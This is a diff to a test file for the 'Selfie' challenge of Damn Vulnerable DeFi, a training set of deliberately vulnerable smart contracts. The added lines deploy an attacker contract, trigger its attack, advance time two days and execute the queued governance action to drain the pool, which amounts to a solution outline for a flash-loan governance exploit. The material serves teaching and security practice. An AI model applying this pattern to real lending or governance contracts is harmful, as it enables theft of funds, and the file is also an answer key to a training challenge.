@@ -4,6 +4,7 @@ pragma solidity ^0.8.0;
 import "@test/BaseTest.sol";
 import "@src/damn-vulnerable-defi/selfie/SelfiePool.sol";
 import "@src/damn-vulnerable-defi/selfie/SimpleGovernance.sol";
+import "@src/damn-vulnerable-defi/selfie/SelfiePoolAttacker.sol";
 import "src/damn-vulnerable-defi/DamnValuableTokenSnapshot.sol";
 
 contract SelfieTest is BaseTest {
@@ -41,6 +42,11 @@ contract SelfieTest is BaseTest {
 
   function testSelfie() public {
     /** CODE YOUR SOLUTION HERE */
+    vm.startPrank(player);
+    SelfiePoolAttacker spa = new SelfiePoolAttacker(address(pool), address(token), address(governance));
+    spa.attack();
+    vm.warp(2 days + 1);
+    governance.executeAction(spa.actionId());
 
     /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
     // Player has taken all tokens from the pool
